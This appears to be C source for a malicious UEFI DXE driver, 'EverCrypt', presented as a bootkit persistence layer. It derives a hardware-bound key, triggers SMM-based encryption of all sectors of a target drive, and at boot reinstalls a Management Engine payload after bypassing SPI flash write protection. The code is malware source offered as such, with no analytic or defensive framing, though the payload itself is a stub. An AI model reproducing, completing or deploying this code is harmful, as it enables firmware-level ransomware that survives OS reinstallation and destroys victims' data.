/** @file
  EverCrypt DXE Driver - Main Entry Point
  
  Persistence layer that survives OS reinstallation
**/

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Library/IoLib.h>
#include <Library/PciLib.h>
#include <Protocol/SmmCommunication.h>
#include <Protocol/SmmAccess2.h>

#include "../Include/EverCryptProto.h"

//
// Global Protocol Instance
//
EFI_GUID gEverCryptProtocolGuid = EVERCRYPT_PROTOCOL_GUID;
EVERCRYPT_PROTOCOL mEverCryptProtocol;

//
// ME Communication Addresses (Platform-specific)
//
#define ME_SIGNATURE_ADDR     0xFEDC0000  // MMIO base
#define HECI_BASE_ADDR        0xFED10000
#define SPI_BASE_ADDR         0xFED1F800

//
// External functions
//
extern EFI_STATUS SpiBypassWriteProtection(VOID);
extern EFI_STATUS SpiWriteFirmware(UINT32 Offset, UINT8 *Data, UINT32 Size);

/**
  Check if ME payload is active

  @retval TRUE   ME payload detected
  @retval FALSE  ME payload not found
**/
BOOLEAN
CheckMeInfection (
  VOID
  )
{
  volatile UINT8 *MeSignature;
  
  MeSignature = (volatile UINT8 *)(UINTN)ME_SIGNATURE_ADDR;
  
  // Check for "ECRYPT" signature
  if (MeSignature[0] == 'E' &&
      MeSignature[1] == 'C' &&
      MeSignature[2] == 'R' &&
      MeSignature[3] == 'Y' &&
      MeSignature[4] == 'P' &&
      MeSignature[5] == 'T') {
    return TRUE;
  }
  
  return FALSE;
}

/**
  Derive hardware-bound encryption key
  
  Implementation of EVERCRYPT_PROTOCOL.DeriveKey
**/
EFI_STATUS
EFIAPI
EverCryptDeriveKey (
  IN  EVERCRYPT_PROTOCOL  *This,
  OUT UINT8               *Key
  )
{
  UINT32  CpuId[4];
  UINT64  MsrValue;
  UINT8   *KeyPtr;
  UINTN   i;
  
  if (Key == NULL) {
    return EFI_INVALID_PARAMETER;
  }
  
  KeyPtr = Key;
  
  // Read CPU serial number (CPUID leaf 3)
  AsmCpuid(0x03, &CpuId[0], &CpuId[1], &CpuId[2], &CpuId[3]);
  CopyMem(KeyPtr, CpuId, 16);
  KeyPtr += 16;
  
  // Read Platform ID from MSR 0x17
  MsrValue = AsmReadMsr64(0x17);
  CopyMem(KeyPtr, &MsrValue, 8);
  KeyPtr += 8;
  
  // Mix with ME fuses (read via HECI)
  for (i = 0; i < 8; i++) {
    KeyPtr[i] = MmioRead8(ME_SIGNATURE_ADDR + 0x1000 + i);
  }
  
  // Simple mixing (production would use HKDF)
  for (i = 0; i < EVERCRYPT_KEY_SIZE; i++) {
    Key[i] ^= 0xA5;
    Key[i] = (Key[i] << 3) | (Key[i] >> 5);
  }
  
  return EFI_SUCCESS;
}

/**
  Trigger encryption from SMM
**/
EFI_STATUS
EFIAPI
EverCryptTriggerEncryption (
  IN EVERCRYPT_PROTOCOL  *This,
  IN UINT8               TargetDrive
  )
{
  EFI_STATUS                      Status;
  EFI_SMM_COMMUNICATION_PROTOCOL  *SmmComm;
  EVERCRYPT_SMM_ENCRYPT_DATA      *CommData;
  UINTN                           CommSize;
  
  // Locate SMM Communication Protocol
  Status = gBS->LocateProtocol(
                  &gEfiSmmCommunicationProtocolGuid,
                  NULL,
                  (VOID **)&SmmComm
                  );
  if (EFI_ERROR(Status)) {
    return Status;
  }
  
  // Allocate communication buffer
  CommSize = sizeof(EVERCRYPT_SMM_ENCRYPT_DATA);
  CommData = AllocateZeroPool(CommSize);
  if (CommData == NULL) {
    return EFI_OUT_OF_RESOURCES;
  }
  
  // Prepare command
  CommData->Header.Command  = EVERCRYPT_CMD_ENCRYPT_TRIGGER;
  CommData->Header.DataSize = sizeof(EVERCRYPT_SMM_ENCRYPT_DATA) - sizeof(EVERCRYPT_SMM_COMM_HEADER);
  CommData->DriveIndex      = TargetDrive;
  CommData->StartLBA        = 0;
  CommData->EndLBA          = 0xFFFFFFFFFFFFFFFFULL; // All sectors
  
  // Trigger SMI
  Status = SmmComm->Communicate(
                      SmmComm,
                      CommData,
                      &CommSize
                      );
  
  FreePool(CommData);
  return Status;
}

/**
  Check bootkit integrity
**/
EFI_STATUS
EFIAPI
EverCryptCheckIntegrity (
  IN  EVERCRYPT_PROTOCOL  *This,
  OUT UINT8               *Status
  )
{
  if (Status == NULL) {
    return EFI_INVALID_PARAMETER;
  }
  
  // Check ME payload
  if (CheckMeInfection()) {
    *Status = EVERCRYPT_STATUS_ACTIVE;
  } else {
    *Status = EVERCRYPT_STATUS_COMPROMISED;
  }
  
  return EFI_SUCCESS;
}

/**
  Reinstall bootkit if removed
**/
EFI_STATUS
EFIAPI
EverCryptReinstall (
  IN EVERCRYPT_PROTOCOL  *This
  )
{
  EFI_STATUS  Status;
  UINT8       MePayload[32768]; // 32KB ME payload
  
  // Check if already installed
  if (CheckMeInfection()) {
    return EFI_ALREADY_STARTED;
  }
  
  // Bypass SPI write protection
  Status = SpiBypassWriteProtection();
  if (EFI_ERROR(Status)) {
    DEBUG((DEBUG_ERROR, "[EverCrypt] SPI bypass failed: %r\n", Status));
    return Status;
  }
  
  // Read ME payload from embedded resource
  // (In production, this would be stored in NVRAM or SMM)
  SetMem(MePayload, sizeof(MePayload), 0);
  // TODO: Load actual evercrypt_me_padded.bin
  
  // Write to ME region (offset 0x1000 in FIT)
  Status = SpiWriteFirmware(0x1000, MePayload, sizeof(MePayload));
  if (EFI_ERROR(Status)) {
    DEBUG((DEBUG_ERROR, "[EverCrypt] ME reflash failed: %r\n", Status));
    return Status;
  }
  
  DEBUG((DEBUG_INFO, "[EverCrypt] Reinstallation complete\n"));
  return EFI_SUCCESS;
}

/**
  DXE Driver Entry Point
**/
EFI_STATUS
EFIAPI
EverCryptDxeEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;
  UINT8       IntegrityStatus;
  
  DEBUG((DEBUG_INFO, "[EverCrypt] DXE Driver loaded\n"));
  
  // Initialize protocol
  mEverCryptProtocol.Version            = EVERCRYPT_PROTOCOL_VERSION;
  mEverCryptProtocol.DeriveKey          = EverCryptDeriveKey;
  mEverCryptProtocol.TriggerEncryption  = EverCryptTriggerEncryption;
  mEverCryptProtocol.CheckIntegrity     = EverCryptCheckIntegrity;
  mEverCryptProtocol.Reinstall          = EverCryptReinstall;
  
  // Install protocol
  Status = gBS->InstallProtocolInterface(
                  &ImageHandle,
                  &gEverCryptProtocolGuid,
                  EFI_NATIVE_INTERFACE,
                  &mEverCryptProtocol
                  );
  if (EFI_ERROR(Status)) {
    DEBUG((DEBUG_ERROR, "[EverCrypt] Protocol install failed: %r\n", Status));
    return Status;
  }
  
  // Check integrity
  EverCryptCheckIntegrity(&mEverCryptProtocol, &IntegrityStatus);
  
  if (IntegrityStatus != EVERCRYPT_STATUS_ACTIVE) {
    DEBUG((DEBUG_WARN, "[EverCrypt] ME payload missing, reinstalling...\n"));
    EverCryptReinstall(&mEverCryptProtocol);
  }
  
  DEBUG((DEBUG_INFO, "[EverCrypt] Ring -2 active\n"));
  
  return EFI_SUCCESS;
}